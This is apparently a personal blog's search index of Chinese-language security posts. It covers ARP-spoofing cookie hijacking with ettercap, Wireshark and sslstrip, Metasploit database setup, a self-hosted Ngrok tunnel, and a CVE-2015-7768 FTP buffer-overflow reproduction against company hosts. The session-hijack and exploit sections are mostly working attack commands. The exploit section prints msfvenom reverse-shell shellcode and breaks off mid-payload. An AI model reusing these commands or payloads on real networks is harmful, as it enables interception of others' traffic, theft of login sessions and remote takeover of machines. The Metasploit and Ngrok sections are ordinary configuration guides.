<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网arp嗅探https</title>
      <link href="arp/"/>
      <url>arp/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="1-环境-amp-工具"><a href="#1-环境-amp-工具" class="headerlink" title="1#环境&amp;工具"></a>1#环境&amp;工具</h3><table><thead><tr><th>角色</th><th>IP</th><th>MAC</th></tr></thead><tbody><tr><td>Attack</td><td>192.168.1.8</td><td>52:54:00:6e:dd:7c</td></tr><tr><td>Target</td><td>192.168.1.7</td><td>00-0C-29-89-1C-30</td></tr><tr><td>Route</td><td>192.168.1.1</td><td>74-13-bb-4d-3f-20</td></tr></tbody></table><p><code>ettercap</code> 是针对中级攻击者的综合套件。它具有实时连接嗅探，动态内容过滤以及许多其他有趣的技巧。它支持许多协议的主动和被动解剖，并包括许多用于网络和主机分析的功能。</p><p><code>sslstrip</code>sslstrip是实现Moxie Marlinspike的SSL剥离的MITM攻击工具。</p><h3 id="2-劫持Cookie"><a href="#2-劫持Cookie" class="headerlink" title="2#劫持Cookie"></a>2#劫持Cookie</h3><p>配置开启中间人攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ettercap -i eth0 -T -M arp:remote &#x2F;192.168.1.7&#x2F;&#x2F; &#x2F;192.168.1.1&#x2F;&#x2F;</span><br><span class="line">ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team</span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:80:1E:8D</span><br><span class="line">  192.168.1.9&#x2F;255.255.255.0</span><br><span class="line">  fe80::20c:29ff:fe80:1e8d&#x2F;64</span><br><span class="line">  2409:8a55:38a0:c330:20c:29ff:fe80:1e8d&#x2F;64</span><br><span class="line">  2409:8a55:38a0:c330:f141:2c85:4d7e:f028&#x2F;64</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"> GROUP 1 : 192.168.1.7 00:0C:29:89:1C:30</span><br><span class="line"> GROUP 2 : 192.168.1.1 74:13:BB:4D:3F:20</span><br></pre></td></tr></table></figure><p><code>-i</code> 指定接口<br><code>-T</code> 以命令行方式,文本形式显示<br><code>-M</code> arp欺骗数据嗅探<br><code>-q</code> 不详细显示包内容<br><code>/192.168.1.7//</code>目标<br><code>/192.168.1.1//</code>路由</p><p>使用<code>wireshark</code>抓包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 192.168.1.7 and http.cookie and http.request.method &#x3D;&#x3D; &quot;POST&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/att4ack/image/master/wireshark.png"><br>复制<code>cookie</code>为纯文本<br>现在开始登录目标网站<code>baidu.com</code>，需要借助工具<code>Cookie Hacker 1.0</code>，这里贴出<a href="https://github.com/evilcos/cookiehacker">下载地址</a>    </p><p>首先打开百度可以看到现在是没有登陆的<br><img src="https://raw.githubusercontent.com/att4ack/image/master/baidu.png"><br>注入刚刚抓到的<code>cookie</code>，点击<code>Inject cookie</code>提示OK代表注入成功<br><img src="https://raw.githubusercontent.com/att4ack/image/master/hacker_cookie.png"><br>注入完成后刷新页面就会进入登陆状态<br><img src="https://raw.githubusercontent.com/att4ack/image/master/inject_success.png"></p><h3 id="https-ssl剥离"><a href="#https-ssl剥离" class="headerlink" title="https-ssl剥离"></a>https-ssl剥离</h3><p>安装配置<code>sslstrip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;moxie0&#x2F;sslstrip</span><br><span class="line">cd sslstrip</span><br><span class="line">pip install -y twisted    &#x2F;&#x2F;依赖包</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>转发数据包<code>sslstrip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;1&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080</span><br><span class="line">sslstrip -l 8080    &#x2F;&#x2F;启动sslstrip</span><br></pre></td></tr></table></figure><p>启动以后目标主机访问网站默认是http类型的链接，但是由于这款工具比较旧不能对location跳转进行剥离。<br><img src="https://raw.githubusercontent.com/att4ack/image/master/Windows7.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit配置数据库</title>
      <link href="METASPLOIT-DB/"/>
      <url>METASPLOIT-DB/</url>
      
        <content type="html"><![CDATA[<h3 id="在VPS上安装msf后root用户无法执行msfdb-init命令"><a href="#在VPS上安装msf后root用户无法执行msfdb-init命令" class="headerlink" title="#在VPS上安装msf后root用户无法执行msfdb init命令"></a>#在VPS上安装msf后root用户无法执行<code>msfdb init</code>命令</h3><p>需要安装<code>postgresql</code>服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install -y postgresql</span><br></pre></td></tr></table></figure><p>启动服务器并开机自启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart postgresql &amp;&amp; systemctl enable postgresql</span><br></pre></td></tr></table></figure><p>切换到数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su - postgres</span><br></pre></td></tr></table></figure><p>创建用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createuser msf -P -S -R -D</span><br></pre></td></tr></table></figure><p>创建数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createdb -O msfdb msf</span><br></pre></td></tr></table></figure><p>退出数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure><p>配置Metasploit数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;opt&#x2F;metasploit-framework&#x2F;embedded&#x2F;framework&#x2F;config&#x2F;</span><br><span class="line">cp database.yml.example database.yml</span><br><span class="line">vi database.yml</span><br><span class="line"></span><br><span class="line"># To set up a metasploit database, follow the directions hosted at:</span><br><span class="line"># http:&#x2F;&#x2F;r-7.co&#x2F;MSF-DEV#set-up-postgresql</span><br><span class="line">#</span><br><span class="line"># Kali Linux and the Omnibus installers both include an easy wrapper script for</span><br><span class="line"># managing your database, which may be more convenient than rolling your own.</span><br><span class="line"></span><br><span class="line">development: &amp;pgsql</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  database: msf</span><br><span class="line">  username: msf</span><br><span class="line">  password: hacker</span><br><span class="line">  host: localhost</span><br><span class="line">  port: 5432</span><br><span class="line">  pool: 200</span><br><span class="line">  timeout: 5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>启动msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@ip-172-31-42-202:~# msfconsole</span><br><span class="line"></span><br><span class="line">  +-------------------------------------------------------+</span><br><span class="line">  |  METASPLOIT by Rapid7                                 |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      __________________   |                           |</span><br><span class="line">  |  &#x3D;&#x3D;c(______(o(______(_()  | |&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[***  |</span><br><span class="line">  |             )&#x3D;\           | |  EXPLOIT   \            |</span><br><span class="line">  |            &#x2F;&#x2F; \\          | |_____________\_______    |</span><br><span class="line">  |           &#x2F;&#x2F;   \\         | |&#x3D;&#x3D;[msf &gt;]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\   |</span><br><span class="line">  |          &#x2F;&#x2F;     \\        | |______________________\  |</span><br><span class="line">  |         &#x2F;&#x2F; RECON \\       | \(@)(@)(@)(@)(@)(@)(@)&#x2F;   |</span><br><span class="line">  |        &#x2F;&#x2F;         \\      |  *********************    |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      o O o                |        \&#39;\&#x2F;\&#x2F;\&#x2F;&#39;&#x2F;         |</span><br><span class="line">  |              o O          |         )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;(          |</span><br><span class="line">  |                 o         |       .&#39;  LOOT  &#39;.        |</span><br><span class="line">  | |^^^^^^^^^^^^^^|l___      |      &#x2F;    _||__   \       |</span><br><span class="line">  | |    PAYLOAD     |&quot;&quot;\___, |     &#x2F;    (_||_     \      |</span><br><span class="line">  | |________________|__|)__| |    |     __||_)     |     |</span><br><span class="line">  | |(@)(@)&quot;&quot;&quot;**|(@)(@)**|(@) |    &quot;       ||       &quot;     |</span><br><span class="line">  |  &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D; &#x3D;  |     &#39;--------------&#39;      |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#x3D;[ metasploit v5.0.62-dev-                         ]</span><br><span class="line">+ -- --&#x3D;[ 1949 exploits - 1089 auxiliary - 334 post       ]</span><br><span class="line">+ -- --&#x3D;[ 558 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --&#x3D;[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; db_status</span><br><span class="line">[*] Connected to msf. Connection type: postgresql.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Metaploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建Ngrok服务器</title>
      <link href="Ngrok/"/>
      <url>Ngrok/</url>
      
        <content type="html"><![CDATA[<h3 id="1-前面先说"><a href="#1-前面先说" class="headerlink" title="1#前面先说"></a>1#前面先说</h3><h4 id="What-is-ngrok"><a href="#What-is-ngrok" class="headerlink" title="What is ngrok?"></a>What is ngrok?</h4><p>ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to a locally running web service. ngrok captures and analyzes all traffic over the tunnel for later inspection and replay.   </p><p>Ngrok是一个反向代理，可以创建从公共端点到本地运行的Web服务的安全隧道。ngrok捕获并分析隧道上的所有流量，以便以后检查和重放。</p><p>Ngrok通过网络隧道把内网端口映射到公网，这里贴出Ngrok的<a href="https://github.com/inconshreveable/ngrok.git">项目地址</a></p><h3 id="2-搭建Ngrok"><a href="#2-搭建Ngrok" class="headerlink" title="2#搭建Ngrok"></a>2#搭建Ngrok</h3><p>先拉取代码到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inconshreveable&#x2F;ngrok.git</span><br></pre></td></tr></table></figure><p>生成SSL证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NGROK_DOMAIN&#x3D;&quot;nat.vimc.top&quot;</span><br><span class="line">openssl genrsa -out rootCA.key 2048</span><br><span class="line">openssl req -new -x509 -nodes -key rootCA.key -days 10000 -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -out rootCA.pem</span><br><span class="line">openssl genrsa -out server.key 2048</span><br><span class="line">openssl req -new -key server.key -subj &quot;&#x2F;CN&#x3D;$NGROK_DOMAIN&quot; -out server.csr</span><br><span class="line">openssl x509 -req -in server.csr -CA base.pem -CAkey base.key -CAcreateserial -days 10000 -out server.crt</span><br></pre></td></tr></table></figure><p>替换原有的证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp rootCA.pem ..&#x2F;assets&#x2F;client&#x2F;tls&#x2F;ngrokroot.crt</span><br><span class="line">cp server.crt ..&#x2F;assets&#x2F;server&#x2F;tls&#x2F;snakeoil.crt</span><br><span class="line">cp server.key ..&#x2F;assets&#x2F;server&#x2F;tls&#x2F;snakeoil.key</span><br></pre></td></tr></table></figure><p>编译程序,由于ngrok是go语言编写的所以需要安装go环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yum install golang -y</span><br><span class="line">make release-all    &#x2F;&#x2F;因为是linux平台上编译所以默认是编译的linux上的服务端和客户端，如果需要编译windows客户端则需要执行以下命令</span><br><span class="line">GOOS&#x3D;windows GOARCH&#x3D;amd64 make release-all</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;编译成功后查看bin目录则可以看到编译好的程序。</span><br><span class="line">ls bin&#x2F;</span><br><span class="line">go-bindata  ngrok  ngrokd  windows_amd64</span><br></pre></td></tr></table></figure><p>添加软连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;src&#x2F;ngrok&#x2F;bin&#x2F;ngrokd &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ngrokd -domain&#x3D;nat.vimc.top -log-level&#x3D;ERROR</span><br><span class="line">[09:26:51 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.(*PrefixLogger).Info:83) [registry] [tun] No affinity cache specified</span><br><span class="line">[09:26:51 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.Info:112) Listening for public http connections on [::]:80</span><br><span class="line">[09:26:51 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.Info:112) Listening for public https connections on [::]:443</span><br><span class="line">[09:26:51 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.Info:112) Listening for control and proxy connections on [::]:4443</span><br><span class="line">[09:26:51 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.(*PrefixLogger).Info:83) [metrics] Reporting every 30 seconds</span><br><span class="line">[09:27:21 CST 2019&#x2F;01&#x2F;19] [INFO] (ngrok&#x2F;log.(*PrefixLogger).Info:83) [metrics] Reporting: &#123;&quot;bytesIn.count&quot;:0,&quot;bytesOut.count&quot;:0,&quot;connMeter.count&quot;:0,&quot;connMeter.m1&quot;:0,&quot;httpTunnelMeter.count&quot;:0,&quot;linux&quot;:0,&quot;osx&quot;:0,&quot;other&quot;:0,&quot;tcpTunnelMeter.count&quot;:0,&quot;tunnelMeter.count&quot;:0,&quot;tunnelMeter.m1&quot;:0,&quot;windows&quot;:0&#125;</span><br></pre></td></tr></table></figure><p>配置客户端,先把客户端拷贝到内网主机，创建配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vi config.yml</span><br><span class="line"></span><br><span class="line">server_addr: &#39;nat.vimc.top:4443&#39;    &#x2F;&#x2F;默认4443是客户端链接服务器的端口</span><br><span class="line">tunnels:</span><br><span class="line"> web:</span><br><span class="line">  subdomain: &#39;web&#39;      &#x2F;&#x2F;域名前缀</span><br><span class="line">  proto:</span><br><span class="line">   http: 80   &#x2F;&#x2F;http协议，映射本地80端口</span><br></pre></td></tr></table></figure><p>测试链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrok -config&#x3D;config.yml start-all</span><br><span class="line"></span><br><span class="line">ngrok                                                                                                                            (Ctrl+C to quit)</span><br><span class="line"></span><br><span class="line">Tunnel Status                 online                                                                                                             </span><br><span class="line">Version                       1.7&#x2F;1.7                                                                                                            </span><br><span class="line">Forwarding                    http:&#x2F;&#x2F;web.nat.vimc.top -&gt; 127.0.0.1:80                                                                            </span><br><span class="line">Web Interface                 127.0.0.1:4040                                                                                                     </span><br><span class="line"># Conn                        0                                                                                                                  </span><br><span class="line">Avg Conn Time                 0.00ms  </span><br></pre></td></tr></table></figure><p>访问链接<br><img src="image.gugyu.com/Ngrok_1.png"></p><p>内网主机的80端口运行着nginx，可以看出映射成功了。</p><h3 id="3-如何在后台运行-amp-映射多个端口"><a href="#3-如何在后台运行-amp-映射多个端口" class="headerlink" title="3#如何在后台运行&amp;映射多个端口"></a>3#如何在后台运行&amp;映射多个端口</h3><p>后台运行可以用<code>nohup</code>命令来实现<br>服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nohup ngrokd -domain&#x3D;nat.vimc.top -log&#x3D;stdout -log-level&#x3D;ERROR &gt; &#x2F;dev&#x2F;null &amp;</span><br><span class="line">[root@VM_0_13_centos ~]# netstat -anput</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1629&#x2F;sshd           </span><br><span class="line">tcp        0     52 172.16.0.13:22          116.4.26.156:18538      ESTABLISHED 12803&#x2F;sshd: root@pt</span><br><span class="line">tcp        0    164 172.16.0.13:22          14.221.116.53:4696      ESTABLISHED 7482&#x2F;sshd: root@pts</span><br><span class="line">tcp        0      0 172.16.0.13:22          14.221.116.53:3406      ESTABLISHED 9767&#x2F;sshd: root@pts</span><br><span class="line">tcp        0      0 172.16.0.13:48180       169.254.0.55:5574       ESTABLISHED 557&#x2F;YDService       </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      13339&#x2F;ngrokd        </span><br><span class="line">tcp6       0      0 :::4443                 :::*                    LISTEN      13339&#x2F;ngrokd        </span><br><span class="line">tcp6       0      0 :::443                  :::*                    LISTEN      13339&#x2F;ngrokd</span><br><span class="line">&#x2F;&#x2F;可以看出服务器已经在后台运行了。</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup .&#x2F;ngrok -config&#x3D;config.yml -log&#x3D;stdout -log-level&#x3D;ERROR start-all &amp;</span><br></pre></td></tr></table></figure><p>映射多个端口可以这样写配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">server_addr: &#39;nat.vimc.top:4443&#39;</span><br><span class="line">tunnels:</span><br><span class="line"> web:</span><br><span class="line">  subdomain: &#39;web&#39;</span><br><span class="line">  proto:</span><br><span class="line">   http: 80</span><br><span class="line"> ssh:</span><br><span class="line">  proto:</span><br><span class="line">   tcp: 22</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ngrok -config&#x3D;config.yml start-all</span><br><span class="line"></span><br><span class="line">ngrok                                                                                                                            (Ctrl+C to quit)</span><br><span class="line"></span><br><span class="line">Tunnel Status                 online                                                                                                             </span><br><span class="line">Version                       1.7&#x2F;1.7                                                                                                            </span><br><span class="line">Forwarding                    tcp:&#x2F;&#x2F;nat.vimc.top:36777 -&gt; 127.0.0.1:22                                                                           </span><br><span class="line">Forwarding                    http:&#x2F;&#x2F;web.nat.vimc.top -&gt; 127.0.0.1:80                                                                            </span><br><span class="line">Web Interface                 127.0.0.1:4040                                                                                                     </span><br><span class="line"># Conn                        0                                                                                                                  </span><br><span class="line">Avg Conn Time                 0.00ms                                                                                                             </span><br></pre></td></tr></table></figure><p>测试链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host &#39;nat.vimc.top&#39; resolved to 193.112.25.139.</span><br><span class="line">Connecting to 193.112.25.139:36777...</span><br><span class="line">Connection established.</span><br><span class="line">To escape to local shell, press &#39;Ctrl+Alt+]&#39;.</span><br><span class="line"></span><br><span class="line">Last login: Fri Jan 18 20:29:42 2019 from 192.168.123.44</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p>链接成功</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2015-7768漏洞复现</title>
      <link href="CVE-2015-7768/"/>
      <url>CVE-2015-7768/</url>
      
        <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1#前言"></a>1#前言</h3><p>今天闲来的没事做，就扫了一下公司的内网主机，其中有一部分主机引起了我的注意。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.88</span><br><span class="line">Host is up (0.049s latency).</span><br><span class="line">Not shown: 994 filtered ports</span><br><span class="line">PORT     STATE SERVICE            VERSION</span><br><span class="line">21&#x2F;tcp   open  ftp                Konica Minolta FTP Utility ftpd 1.00</span><br><span class="line">135&#x2F;tcp  open  msrpc              Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389&#x2F;tcp open  ssl&#x2F;ms-wbt-server?</span><br><span class="line">8082&#x2F;tcp open  blackice-alerts?</span><br></pre></td></tr></table></figure><p>就像上面的主机一样都开了一个FTP服务器这是个服务是咱公司的打印机的扫描程序，于是我查了一下该服务的历史漏洞，发现该服务真的存在漏洞，漏洞编码为：CVE-2015-7768，漏洞名称：<code>Konica Minolta FTP Utility缓冲区溢出漏洞</code>，这里我只是单纯的演示复现过程大牛勿喷。</p><h3 id="2-复现"><a href="#2-复现" class="headerlink" title="2#复现"></a>2#复现</h3><p>通过exploit_db找到了现有的POC.<br><a href="https://www.exploit-db.com/exploits/39215/">https://www.exploit-db.com/exploits/39215/</a><br>现在先生成Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@vimc:~# msfvenom -a x86 --platform windows -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3389 -e x86&#x2F;shikata_ga_nai -b &quot;\x00\x0d\x0a\x3d\x5c\x2f&quot; -i 3 -f python</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 351 (iteration&#x3D;0)</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 378 (iteration&#x3D;1)</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 405 (iteration&#x3D;2)</span><br><span class="line">x86&#x2F;shikata_ga_nai chosen with final size 405</span><br><span class="line">Payload size: 405 bytes</span><br><span class="line">Final size of python file: 1950 bytes</span><br><span class="line">buf &#x3D;  &quot;&quot;</span><br><span class="line">buf +&#x3D; &quot;\xba\x0b\x39\x72\xbe\xd9\xce\xd9\x74\x24\xf4\x5e\x29&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc9\xb1\x5f\x31\x56\x14\x83\xc6\x04\x03\x56\x10\xe9&quot;</span><br><span class="line">buf +&#x3D; &quot;\xcc\xab\x72\x56\x47\xff\xfa\xc7\x41\x8b\xd8\xe3\x2a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x5d\xe8\xba\x93\x1e\x2a\xb8\x12\x79\xbd\xc3\x0c\x6f&quot;</span><br><span class="line">buf +&#x3D; &quot;\x23\x5f\xc4\x23\x15\x75\xbe\x87\xac\xb5\xcf\x40\x1a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x5e\x8c\x5f\x67\x29\x86\xda\x70\x47\xbe\x62\x94\xf2&quot;</span><br><span class="line">buf +&#x3D; &quot;\x88\x05\x39\xec\x86\xe5\xb0\x73\x5f\x23\x87\x74\x2d&quot;</span><br><span class="line">buf +&#x3D; &quot;\x94\xe3\xb4\x2b\xfd\xd4\x8f\x82\xc9\x32\x7b\x60\x87&quot;</span><br><span class="line">buf +&#x3D; &quot;\x7a\xcd\x97\xa8\x9d\x04\x0f\xb7\xd6\x95\xf6\x3b\x23&quot;</span><br><span class="line">buf +&#x3D; &quot;\x66\x7a\x6a\xa6\x5a\x8f\xb4\x84\xc9\x45\x24\xd7\x59&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe2\x20\xe8\x3f\x89\xbb\x74\x28\x33\x6b\xef\xed\xb4&quot;</span><br><span class="line">buf +&#x3D; &quot;\xdf\xd4\xcd\xee\x4f\xa3\x08\xce\xc2\xc2\x87\x7c\x36&quot;</span><br><span class="line">buf +&#x3D; &quot;\x03\x96\x9d\xb9\x8c\x38\x5d\x9f\xbb\x34\xda\xae\x07&quot;</span><br><span class="line">buf +&#x3D; 